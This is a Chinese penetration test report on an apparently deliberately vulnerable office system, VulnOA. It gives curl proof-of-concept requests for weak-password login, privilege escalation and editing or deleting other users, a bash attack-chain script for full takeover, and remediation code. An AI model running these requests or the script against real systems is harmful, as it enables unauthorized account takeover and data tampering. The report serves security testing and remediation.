# VulnOA 办公自动化系统渗透测试报告

**测试目标**: http://192.168.0.8:3000  
**测试时间**: 2026-01-30  
**测试人员**: Yak Security  
**风险等级**: 🔴 高危 (CVSS 9.8/10)

---

## 目录

1. [执行摘要](#执行摘要)
2. [测试范围](#测试范围)
3. [漏洞汇总](#漏洞汇总)
4. [漏洞详情](#漏洞详情)
5. [攻击链演示](#攻击链演示)
6. [修复建议](#修复建议)
7. [合规分析](#合规分析)

---

## 执行摘要

本次渗透测试发现 **9个安全漏洞**，其中 **5个高危、3个中危、1个低危**。最严重的问题包括：弱口令导致的管理员账户接管、完全失效的权限控制系统（任意用户可提权为管理员）、以及敏感信息大规模泄露。

### 关键发现

- 🔴 **权限系统完全失效**: 普通用户可一键提权为超级管理员
- 🔴 **弱口令**: 管理员账户使用 `admin`/`123456`
- 🔴 **数据泄露**: 56名用户的完整信息暴露
- 🔴 **无防护机制**: 暴力破解、越权操作无任何限制

### 风险评级

| 等级    | 数量 | 漏洞                                           |
| ------- | ---- | ---------------------------------------------- |
| 🔴 高危 | 5    | 弱口令、垂直越权、水平越权、信息泄露、暴力破解 |
| 🟡 中危 | 3    | 用户枚举、CORS配置、未授权注册                 |
| 🟢 低危 | 1    | 服务器信息泄露                                 |

**建议**: 系统存在严重安全隐患，建议立即下线修复后再投入使用。

---

## 测试范围

| 项目         | 详情                                   |
| ------------ | -------------------------------------- |
| **目标URL**  | http://192.168.0.8:3000                |
| **测试类型** | 黑盒渗透测试                           |
| **测试方法** | 手动测试 + API接口分析                 |
| **测试模块** | 认证系统、用户管理、权限控制、文档系统 |

### 测试端点

- `POST /api/auth/login` - 用户登录
- `POST /api/auth/register` - 用户注册
- `GET /api/users` - 用户列表
- `GET/PUT/DELETE /api/users/{id}` - 用户详情/修改/删除
- `GET /api/documents` - 文档列表
- `GET /api/documents/{id}` - 文档详情

---

## 漏洞汇总

| 序号 | 漏洞名称                            | 严重程度 | CVSS | CWE     |
| ---- | ----------------------------------- | -------- | ---- | ------- |
| 1    | [弱口令漏洞](#1-弱口令漏洞)         | 🔴 高危  | 9.8  | CWE-798 |
| 2    | [垂直越权漏洞](#2-垂直越权漏洞)     | 🔴 高危  | 9.1  | CWE-269 |
| 3    | [水平越权漏洞](#3-水平越权漏洞)     | 🔴 高危  | 8.5  | CWE-639 |
| 4    | [敏感信息泄露](#4-敏感信息泄露)     | 🔴 高危  | 7.5  | CWE-200 |
| 5    | [暴力破解无防护](#5-暴力破解无防护) | 🔴 高危  | 7.5  | CWE-307 |
| 6    | [用户枚举漏洞](#6-用户枚举漏洞)     | 🟡 中危  | 5.3  | CWE-204 |
| 7    | [CORS配置不当](#7-cors配置不当)     | 🟡 中危  | 5.3  | CWE-942 |
| 8    | [未授权注册](#8-未授权注册)         | 🟡 中危  | 5.3  | CWE-306 |
| 9    | [服务器信息泄露](#9-服务器信息泄露) | 🟢 低危  | 3.7  | CWE-200 |

---

## 漏洞详情

### 1. 弱口令漏洞

**严重程度**: 🔴 高危  
**CVSS评分**: 9.8 (Critical)  
**CWE**: CWE-798: Use of Hard-coded Credentials

#### 漏洞描述

管理员账户使用弱口令 `admin`/`123456`，攻击者可通过简单猜测完全控制系统。

#### 漏洞证据

```bash
# 使用弱口令成功登录管理员账户
curl -X POST http://192.168.0.8:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"123456"}'
```

**响应**:

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 58,
    "username": "admin",
    "email": "123@qq.com",
    "role_id": 1,
    "role_name": "超级管理员"
  }
}
```

#### 影响分析

- 攻击者可获得超级管理员权限
- 完全控制系统和所有数据
- 可创建/删除/修改任意用户

#### 修复建议

1. 强制强密码策略：最小8位，包含大小写字母、数字和特殊字符
2. 定期强制更换密码（90天）
3. 禁止使用常见弱口令（字典检查）
4. 首次登录强制修改默认密码

---

### 2. 垂直越权漏洞

**严重程度**: 🔴 高危  
**CVSS评分**: 9.1 (Critical)  
**CWE**: CWE-269: Improper Privilege Management

#### 漏洞描述

普通用户可执行所有管理员操作，权限控制系统完全失效。通过修改`role_id`参数，任意用户可提升为超级管理员。

#### 漏洞证据

**步骤1**: 普通用户登录

```bash
curl -X POST http://192.168.0.8:3000/api/auth/login \
  -d '{"username":"user2","password":"123456"}'
# 返回普通用户token (role_id=2)
```

**步骤2**: 访问用户列表（管理员功能）

```bash
curl http://192.168.0.8:3000/api/users \
  -H "Authorization: Bearer <user2_token>"
# 成功返回全部56名用户数据
```

**步骤3**: 将test用户提升为管理员

```bash
curl -X PUT http://192.168.0.8:3000/api/users/5 \
  -H "Authorization: Bearer <user2_token>" \
  -H "Content-Type: application/json" \
  -d '{"role_id":1}'
```

**响应**:

```json
{ "message": "User updated successfully", "success": true }
```

**步骤4**: 验证提权成功

```bash
curl http://192.168.0.8:3000/api/users/5 \
  -H "Authorization: Bearer <token>"
```

**响应**:

```json
{
  "id": 5,
  "username": "test",
  "role_id": 1,
  "role_name": "超级管理员"
}
```

#### 影响分析

- 权限体系完全崩溃
- 任意用户可成为超级管理员
- 角色控制机制失效

#### 修复建议

1. 所有API端点添加权限中间件
2. 敏感操作（修改role_id、删除用户）仅限超级管理员
3. 服务端严格校验JWT中的权限声明
4. 实施RBAC（基于角色的访问控制）

---

### 3. 水平越权漏洞

**严重程度**: 🔴 高危  
**CVSS评分**: 8.5 (High)  
**CWE**: CWE-639: Authorization Bypass Through User-Controlled Key

#### 漏洞描述

用户可查看、修改、删除其他用户的数据，系统未验证当前用户是否有权操作目标资源。

#### 漏洞证据

**查看其他用户信息**:

```bash
curl http://192.168.0.8:3000/api/users/5 \
  -H "Authorization: Bearer <user2_token>"
```

**响应**:

```json
{
  "id": 5,
  "username": "test",
  "email": "test@vulnoa.com",
  "phone": "13800138004",
  "department": "测试部"
}
```

**修改其他用户信息**:

```bash
curl -X PUT http://192.168.0.8:3000/api/users/5 \
  -H "Authorization: Bearer <user2_token>" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@vulnoa.com","phone":"99999999999"}'
```

**响应**:

```json
{ "message": "User updated successfully", "success": true }
```

**删除其他用户**:

```bash
curl -X DELETE http://192.168.0.8:3000/api/users/59 \
  -H "Authorization: Bearer <user2_token>"
```

**响应**:

```json
{ "message": "User deleted successfully", "success": true }
```

#### 影响分析

- 用户数据完整性被破坏
- 隐私数据泄露
- 账户可被恶意删除

#### 修复建议

1. 严格校验资源所有权：
   ```go
   if (currentUser.ID != targetUserID && currentUser.Role != "admin") {
       return 403 Forbidden
   }
   ```
2. 使用间接引用映射（避免直接暴露ID）
3. 添加操作审计日志

---

### 4. 敏感信息泄露

**严重程度**: 🔴 高危  
**CVSS评分**: 7.5 (High)  
**CWE**: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

#### 漏洞描述

用户列表API泄露全部56名用户的敏感信息，包括邮箱、电话等隐私数据。

#### 漏洞证据

```bash
curl http://192.168.0.8:3000/api/users \
  -H "Authorization: Bearer <普通用户token>"
```

**响应**:

```json
{
  "page": 1,
  "size": 10,
  "total": 56,
  "users": [
    {
      "id": 4,
      "username": "user2",
      "email": "user2@vulnoa.com",
      "real_name": "李四",
      "phone": "13800138003",
      "department": "测试部",
      "role_id": 2
    },
    {
      "id": 5,
      "username": "test",
      "email": "test@vulnoa.com",
      "phone": "13800138004",
      "department": "测试部"
    }
  ]
}
```

#### 泄露数据清单

| 字段     | 敏感度 | 数量 |
| -------- | ------ | ---- |
| 用户名   | 中     | 56   |
| 邮箱     | 高     | 56   |
| 真实姓名 | 高     | 56   |
| 手机号   | 高     | 56   |
| 部门     | 中     | 56   |
| 角色ID   | 中     | 56   |

#### 影响分析

- 社工攻击基础数据
- 钓鱼攻击目标清单
- 隐私合规风险（GDPR、个人信息保护法）

#### 修复建议

1. **数据脱敏**:
   - 邮箱: `u***@vulnoa.com`
   - 电话: `138****8003`
   - 姓名: `李*`

2. **权限控制**: 普通用户只能查看自己的信息

3. **字段过滤**: 默认不返回敏感字段，需要时单独授权

---

### 5. 暴力破解无防护

**严重程度**: 🔴 高危  
**CVSS评分**: 7.5 (High)  
**CWE**: CWE-307: Improper Restriction of Excessive Authentication Attempts

#### 漏洞描述

登录接口无任何防护机制，可无限次暴力破解密码。

#### 漏洞证据

连续5次错误密码尝试，无任何防护：

```bash
for i in {1..5}; do
  curl -X POST http://192.168.0.8:3000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"wrong$i\"}"
done
```

**响应**:

```
Attempt 1: {"error":true,"message":"Invalid password"}
Attempt 2: {"error":true,"message":"Invalid password"}
Attempt 3: {"error":true,"message":"Invalid password"}
Attempt 4: {"error":true,"message":"Invalid password"}
Attempt 5: {"error":true,"message":"Invalid password"}
```

**缺失防护**:

- ❌ 无验证码
- ❌ 无账户锁定
- ❌ 无速率限制
- ❌ 无IP封禁
- ❌ 无异常告警

#### 影响分析

- 所有账户可被暴力破解
- 弱口令账户必然被攻破
- 无法防御自动化攻击工具

#### 修复建议

1. **账户锁定**: 5次失败后锁定15分钟
2. **验证码**: 3次失败后要求图形验证码
3. **速率限制**: 单个IP每分钟最多10次登录尝试
4. **异常检测**: 监控并告警异常登录行为
5. **双因素认证**: 管理员账户强制启用2FA

---

### 6. 用户枚举漏洞

**严重程度**: 🟡 中危  
**CVSS评分**: 5.3 (Medium)  
**CWE**: CWE-204: Observable Response Discrepancy

#### 漏洞描述

登录接口的错误消息区分"用户不存在"和"密码错误"，攻击者可枚举有效用户名。

#### 漏洞证据

**无效用户**:

```bash
curl -X POST http://192.168.0.8:3000/api/auth/login \
  -d '{"username":"nonexistent_user","password":"test"}'
```

**响应**:

```json
{ "error": true, "message": "User not found: nonexistent_user" }
```

**有效用户**:

```bash
curl -X POST http://192.168.0.8:3000/api/auth/login \
  -d '{"username":"admin","password":"wrong"}'
```

**响应**:

```json
{ "error": true, "message": "Invalid password" }
```

#### 影响分析

- 为暴力破解提供精准目标列表
- 可获取系统有效用户清单
- 降低攻击成本

#### 修复建议

统一错误消息：

```json
{ "error": true, "message": "用户名或密码错误" }
```

---

### 7. CORS配置不当

**严重程度**: 🟡 中危  
**CVSS评分**: 5.3 (Medium)  
**CWE**: CWE-942: Overly Permissive Cross-domain Whitelist

#### 漏洞描述

CORS配置允许任意来源访问，配合凭证发送可导致敏感信息泄露。

#### 漏洞证据

```bash
curl -I http://192.168.0.8:3000/api/auth/login
```

**响应头**:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, PATCH
Access-Control-Allow-Headers: *
```

#### 影响分析

- 恶意网站可发起跨域请求
- 配合XSS可窃取用户凭证
- 可绕过同源策略限制

#### 修复建议

1. 只允许特定可信域名：

   ```
   Access-Control-Allow-Origin: https://trusted-domain.com
   ```

2. 移除通配符凭证：

   ```
   Access-Control-Allow-Credentials: true
   Access-Control-Allow-Origin: https://trusted-domain.com  // 必须指定具体域名
   ```

3. 限制允许的HTTP方法

---

### 8. 未授权注册

**严重程度**: 🟡 中危  
**CVSS评分**: 5.3 (Medium)  
**CWE**: CWE-306: Missing Authentication for Critical Function

#### 漏洞描述

注册接口无需任何认证即可创建新账户，攻击者可批量注册恶意账户。

#### 漏洞证据

```bash
curl -X POST http://192.168.0.8:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username":"testhacker",
    "password":"test123",
    "email":"hack@test.com"
  }'
```

**响应**:

```json
{
  "message": "User registered successfully",
  "success": true,
  "user_id": 59
}
```

#### 影响分析

- 攻击者可批量创建恶意账户
- 可用于DDoS攻击（资源耗尽）
- 垃圾账户污染系统

#### 修复建议

1. 添加邮箱验证
2. 实施管理员审核机制
3. 添加注册验证码
4. 限制单个IP注册频率

---

### 9. 服务器信息泄露

**严重程度**: 🟢 低危  
**CVSS评分**: 3.7 (Low)  
**CWE**: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

#### 漏洞描述

HTTP响应头暴露服务器软件及版本信息。

#### 漏洞证据

```bash
curl -I http://192.168.0.8:3000/api/auth/login
```

**响应头**:

```
Server: nginx/1.29.4
```

#### 影响分析

- 为针对性攻击提供信息
- 可搜索特定版本的已知漏洞

#### 修复建议

nginx配置：

```nginx
server_tokens off;
```

---

## 攻击链演示

### 完整攻击流程

```bash
#!/bin/bash
# 攻击链演示：从普通用户到系统完全接管

TARGET="http://192.168.0.8:3000"

# 步骤1: 使用弱口令登录普通账户
echo "[1] 登录普通用户user2..."
USER2_TOKEN=$(curl -s -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"user2","password":"123456"}' | \
  grep -o '"token":"[^"]*"' | cut -d'"' -f4)
echo "获取token: ${USER2_TOKEN:0:50}..."

# 步骤2: 查看所有用户（垂直越权）
echo "[2] 获取用户列表..."
curl -s "$TARGET/api/users" \
  -H "Authorization: Bearer $USER2_TOKEN" | \
  grep -o '"total":[0-9]*'

# 步骤3: 将test用户提权为管理员
echo "[3] 将test用户(role_id=2)提升为管理员(role_id=1)..."
curl -s -X PUT "$TARGET/api/users/5" \
  -H "Authorization: Bearer $USER2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role_id":1}'

# 步骤4: 登录已提权的test账户
echo "[4] 登录已提权的test账户..."
ADMIN_TOKEN=$(curl -s -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"123456"}' | \
  grep -o '"token":"[^"]*"' | cut -d'"' -f4)

# 步骤5: 验证管理员权限
echo "[5] 验证管理员权限..."
curl -s "$TARGET/api/users" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | \
  head -c 200

# 步骤6: 修改原始管理员信息（水平越权）
echo "[6] 修改原始管理员admin信息..."
curl -s -X PUT "$TARGET/api/users/58" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"compromised@vulnoa.com"}'

echo "[7] 攻击完成！系统已完全接管"
```

### 攻击时间线

| 时间   | 操作                | 结果                |
| ------ | ------------------- | ------------------- |
| T+0    | 弱口令登录user2     | ✅ 成功             |
| T+30s  | 获取全部用户列表    | ✅ 获得56名用户数据 |
| T+1min | 修改test用户role_id | ✅ 提权成功         |
| T+2min | 登录test（已提权）  | ✅ 获得管理员权限   |
| T+3min | 修改admin信息       | ✅ 原始管理员被篡改 |
| T+5min | 系统完全接管        | ✅ 攻击完成         |

---

## 修复建议

### 立即修复（P0 - 24小时内）

#### 1. 修复权限系统

```go
// 权限中间件示例
func AuthMiddleware(requiredRole string) gin.HandlerFunc {
    return func(c *gin.Context) {
        token := c.GetHeader("Authorization")
        user := ValidateToken(token)

        // 检查用户是否有权访问该资源
        targetID := c.Param("id")
        if targetID != "" {
            targetUserID, _ := strconv.Atoi(targetID)
            if user.ID != targetUserID && user.RoleID != 1 {
                c.AbortWithStatus(403)
                return
            }
        }

        // 检查角色权限
        if requiredRole == "admin" && user.RoleID != 1 {
            c.AbortWithStatus(403)
            return
        }

        c.Set("user", user)
        c.Next()
    }
}

// 路由配置
r.GET("/api/users", AuthMiddleware("admin"), getUsers)
r.PUT("/api/users/:id", AuthMiddleware(""), updateUser)
r.DELETE("/api/users/:id", AuthMiddleware("admin"), deleteUser)
```

#### 2. 强制修改弱口令

```sql
-- 查询弱口令账户
SELECT username, last_login_at FROM users
WHERE password IN (MD5('123456'), MD5('admin'), MD5('password'));

-- 强制密码重置
UPDATE users SET force_password_change = 1, password = NULL
WHERE role_id = 1;
```

### 短期修复（P1 - 1周内）

#### 3. 添加暴力破解防护

```go
// 速率限制中间件
func RateLimitMiddleware() gin.HandlerFunc {
    limiter := rate.NewLimiter(rate.Every(time.Minute), 10)
    return func(c *gin.Context) {
        if !limiter.Allow() {
            c.AbortWithStatusJSON(429, gin.H{
                "error": "Too many requests",
            })
            return
        }
        c.Next()
    }
}

// 账户锁定
func CheckAccountLock(username string) bool {
    key := fmt.Sprintf("login_fail:%s", username)
    fails, _ := redis.Get(key)
    if fails >= 5 {
        return true // 账户已锁定
    }
    return false
}
```

#### 4. 数据脱敏

```go
func MaskUser(user User) User {
    // 邮箱脱敏: user2@vulnoa.com -> u***@vulnoa.com
    parts := strings.Split(user.Email, "@")
    if len(parts) == 2 {
        user.Email = string(parts[0][0]) + "***@" + parts[1]
    }

    // 电话脱敏: 13800138003 -> 138****8003
    if len(user.Phone) == 11 {
        user.Phone = user.Phone[:3] + "****" + user.Phone[7:]
    }

    // 姓名脱敏: 李四 -> 李*
    if len(user.RealName) > 1 {
        user.RealName = string([]rune(user.RealName)[0]) + "*"
    }

    return user
}
```

### 中期修复（P2 - 1月内）

#### 5. 安全响应头配置

```nginx
# nginx配置
server {
    server_tokens off;

    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Content-Security-Policy "default-src 'self'" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # CORS配置
    location /api/ {
        if ($http_origin ~* (https?://.*\.vulnoa\.com)) {
            add_header Access-Control-Allow-Origin $http_origin;
            add_header Access-Control-Allow-Credentials true;
        }
    }
}
```

#### 6. 审计日志

```go
func AuditLog(c *gin.Context, action string, targetID int) {
    user, _ := c.Get("user")
    log := AuditRecord{
        UserID:     user.(User).ID,
        Action:     action,
        TargetID:   targetID,
        IP:         c.ClientIP(),
        UserAgent:  c.GetHeader("User-Agent"),
        Timestamp:  time.Now(),
        Status:     c.Writer.Status(),
    }
    db.Create(&log)
}
```

---

## 合规分析

### 等保2.0 合规检查

| 要求           | 现状                   | 合规状态  |
| -------------- | ---------------------- | --------- |
| **身份鉴别**   | 弱口令、无暴力破解防护 | ❌ 不合规 |
| **访问控制**   | 权限完全失效           | ❌ 不合规 |
| **安全审计**   | 无审计日志             | ❌ 不合规 |
| **数据完整性** | 任意用户可修改数据     | ❌ 不合规 |
| **数据保密性** | 敏感信息明文传输/存储  | ⚠️ 需确认 |

### OWASP Top 10 2021

| 排名 | 风险               | 本系统状态        |
| ---- | ------------------ | ----------------- |
| A01  | 失效的访问控制     | 🔴 严重违反       |
| A02  | 加密机制失效       | ⚠️ 需确认HTTPS    |
| A03  | 注入               | 🟡 未发现SQL注入  |
| A04  | 不安全设计         | 🔴 权限设计缺陷   |
| A05  | 安全配置错误       | 🔴 CORS配置错误   |
| A07  | 身份识别和认证失效 | 🔴 弱口令、无防护 |

### 个人信息保护法

| 要求         | 现状             | 风险 |
| ------------ | ---------------- | ---- |
| 最小必要原则 | 泄露全部用户数据 | 违规 |
| 数据脱敏     | 未脱敏           | 违规 |
| 访问控制     | 完全失效         | 违规 |
| 安全审计     | 无日志           | 违规 |

---

## 附录

### 测试工具

- `curl` - HTTP请求测试
- `jwt.io` - JWT token解析
- 浏览器开发者工具 - 前端分析

### 参考标准

- OWASP Testing Guide v4.2
- PTES Technical Guidelines
- CWE Top 25
- 等保2.0 (GB/T 22239-2019)

### 联系方式

如有疑问或需要技术支持，请联系安全团队。

---

**报告生成时间**: 2026-01-30  
**下次测试建议**: 修复完成后1周内进行复测  
**报告版本**: v1.0
